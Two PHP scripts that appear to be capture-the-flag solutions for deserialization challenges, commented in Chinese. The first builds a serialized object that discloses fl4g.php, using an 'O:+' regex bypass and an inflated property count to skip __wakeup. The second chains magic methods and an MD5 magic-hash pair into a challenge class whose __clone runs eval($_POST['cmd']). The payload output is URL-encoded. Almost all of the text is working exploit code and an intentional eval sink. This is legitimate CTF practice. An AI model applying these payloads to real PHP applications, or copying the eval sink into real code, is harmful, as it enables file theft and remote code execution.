<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
$A = new Demo ('fl4g.php');					// 创建对象
$C = serialize($A);                         // 对对象A进行序列化
$C = str_replace('O:','O:+',$C);            // 绕过正则表达式过滤
$C = str_replace(':1:',':2:',$C); 		    // 绕过__wakeup
var_dump($C);
var_dump(base64_encode($C));                //base64加密
?>




<?php
class B{
    public $pop;
    public $i = "1";
    public $nogame;
    public function __destruct()
    {
        if(preg_match("/233333333/",$this->pop)){     // 触发A的__toString
            echo "这是一道签到题，不能让新生一直做不出来遭受打击";
        }
    }
    public function game(){
        echo "扣1送地狱火";
        if ($this->i = "1"){
            echo '<img src=\'R.jpg\'>';
            $this->nogame->love();                    // 触发P的__call
        }
    }
    public function __clone(){
        echo "必须执行";
        eval($_POST["cmd"]);
    }
}
class A{
    public $Aec;
    public $girl = "s155964671a";
    public $boy = "s878926199a";
    public function __toString()
    {
        echo "I also want to fall in love";
        if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){
            $this->Aec->game();
        }
    }
}
class P{
    public $MyLover;
    public function __call($name, $arguments)
    {
        echo "有对象我会在这打CTF???看我克隆一个对象！";
        if ($name != "game") {
            echo "打游戏去，别想着对象了";
            $this->MyLover = clone new B;
        }
    }
}
$b = new B();
$b1 = new B();
$b1->nogame = new P();
$a = new A();
$a->Aec = $b1;
$b->pop = $a;
var_dump(urlencode(serialize($b)));
